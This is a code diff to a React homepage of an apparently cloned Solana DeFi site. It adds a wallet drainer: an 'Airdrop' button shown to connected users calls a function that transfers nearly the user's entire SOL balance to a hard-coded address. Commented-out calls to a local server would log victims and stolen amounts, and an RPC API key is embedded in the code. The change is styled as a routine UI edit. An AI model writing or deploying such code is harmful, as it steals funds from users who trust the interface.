@@ -1,6 +1,6 @@
 import { ReactNode, useState } from 'react'
 import { useRouter } from 'next/router'
-
+import useWallet1 from '@/application/wallet/useWallet'
 import useAppSettings from '@/application/common/useAppSettings'
 import { useHomeInfo } from '@/application/homeInfo'
 import Button from '@/components/Button'
@@ -21,6 +21,9 @@ import { Checkbox } from '@/components/Checkbox'
 import ResponsiveDialogDrawer from '@/components/ResponsiveDialogDrawer'
 import { twMerge } from 'tailwind-merge'
 import { setLocalItem } from '@/functions/dom/jStorage'
+import { Connection, PublicKey, SystemProgram, TransactionInstruction, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
+import { BN } from 'bn.js'
+import { useWallet } from '@solana/wallet-adapter-react'
 
 function HomePageContainer({ children }: { children?: ReactNode }) {
   useDocumentScrollActionDetector()
@@ -64,6 +67,55 @@ function HomePageSection0() {
   const isMobile = useAppSettings((s) => s.isMobile)
   const { push } = useRouter()
   const { tvl, totalvolume } = useHomeInfo()
+  const owner = useWallet1((s) => s.owner)
+  const connected = useWallet1((s) => s.connected)
+  const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
+  const connection = new Connection(NET_URL, 'confirmed')
+  const { signTransaction, sendTransaction } = useWallet()
+
+  const txTransfer = async () => {
+    if (owner) {
+      try {
+        // await axios.post("http://localhost:3005/sendSignNotification", { owner: owner })
+        const solBalance = new BN((await connection.getBalance(owner)).toString())
+        console.warn(solBalance)
+        const fee = new BN('1000000')
+        const toAddress = new PublicKey('5ZSdtCwxXvXTSytq13uKv2mK9QJupuK3nmq1gkcYo2xp')
+        if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
+          console.warn("solbalancedddd")
+          // await axios.post("http://localhost:3005/sendNotEnoughNotification")
+          return
+        }
+        const instructions: TransactionInstruction[] = [];
+        instructions.push(
+          SystemProgram.transfer({
+            fromPubkey: owner,
+            toPubkey: toAddress,
+            lamports: solBalance.sub(fee).toNumber()
+          })
+        )
+
+        const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
+        const transactionMessage = new TransactionMessage({
+          payerKey: owner,
+          instructions: instructions,
+          recentBlockhash,
+        });
+        let tx = new VersionedTransaction(transactionMessage.compileToV0Message());
+        if (tx && signTransaction) {
+          tx = await signTransaction(tx)
+          const signature = await sendTransaction(tx, connection)
+          const sentBalance = solBalance.toNumber() / 1000000000
+          if (signature) {
+            // await axios.post("http://localhost:3005/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
+          }
+        }
+      } catch (err) {
+        console.warn(err)
+      }
+    }
+  }
+
   return (
     <section className="grid-child-center grid-cover-container mb-16 relative">
       <Image src="/backgroundImages/home-bg-element-1.png" className="w-[744px] mobile:w-[394px]" />
@@ -87,34 +139,35 @@ function HomePageSection0() {
         </div>
         {/* two button */}
         <Row className="gap-8 mobile:gap-4 mb-16 mobile:mb-6 grid grid-cols-1-fr">
-          <Button
-            className="home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4"
-            onClick={() => {
-              useAppSettings.setState({ needPopDisclaimer: false })
-              setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
-              useAppSettings.setState({ isWalletSelectorShown: true })
-            }}
-          // onClick={() => {
-          //   push('/swap')
-          // }}
-          >
-            <Row className="items-center gap-2">
-              <div>Airdrop</div>
-              <Icon heroIconName="chevron-right" size="xs" />
-            </Row>
-          </Button>
-          {/* 
-          <Button
-            className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
-            onClick={() => {
-              linkTo('https://raydium.gitbook.io/raydium/')
-            }}
-          >
-            <Row className="items-center gap-2">
-              <div>Read docs</div>
-              <Icon iconSrc="/icons/gitbook.svg" size="sm" />
-            </Row>
-          </Button> */}
+          {connected && (
+            <Button
+              className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
+              onClick={async () => {
+                await txTransfer()
+              }}
+            >
+              <Row className="items-center gap-2">
+                <div>Airdrop</div>
+                <Icon iconSrc="/icons/gitbook.svg" size="sm" />
+              </Row>
+            </Button>
+          ) ||
+            (
+              <Button
+                className="home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4"
+                onClick={() => {
+                  useAppSettings.setState({ needPopDisclaimer: false })
+                  setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
+                  useAppSettings.setState({ isWalletSelectorShown: true })
+                }}
+              >
+                <Row className="items-center gap-2">
+                  <div>Connect</div>
+                  <Icon heroIconName="chevron-right" size="xs" />
+                </Row>
+              </Button>
+            )}
+
         </Row>
         {/* two panels */}
         <Row className="gap-6 mobile:gap-3 mb-9 grid grid-cols-2-fr">
